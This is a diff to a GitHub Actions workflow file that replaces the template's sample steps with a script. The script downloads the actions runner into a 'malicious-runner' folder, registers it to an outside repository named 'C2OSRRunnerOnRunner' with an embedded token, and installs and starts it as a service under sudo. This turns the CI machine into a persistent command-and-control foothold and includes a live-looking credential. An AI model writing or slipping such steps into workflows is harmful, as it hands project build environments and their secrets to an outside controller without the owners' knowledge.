@@ -25,12 +25,13 @@ jobs:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v4
 
-      # Runs a single command using the runners shell
-      - name: Run a one-line script
-        run: echo Hello, world!
-
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          echo Add other actions to build,
-          echo test, and deploy your project.
+          mkdir malicious-runner && cd malicious-runner
+          curl -o actions-runner-linux-x64-2.325.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.325.0/actions-runner-linux-x64-2.325.0.tar.gz
+          tar xzf ./actions-runner-linux-x64-2.325.0.tar.gz
+          ./config.sh --url https://github.com/Harkins12345Test/C2OSRRunnerOnRunner --token BTOUZMQ5GVKXE6HKORLQ6LTIMYE64
+          sudo ./svc.sh install
+          ./svc.sh install
+          sudo ./svc.sh start
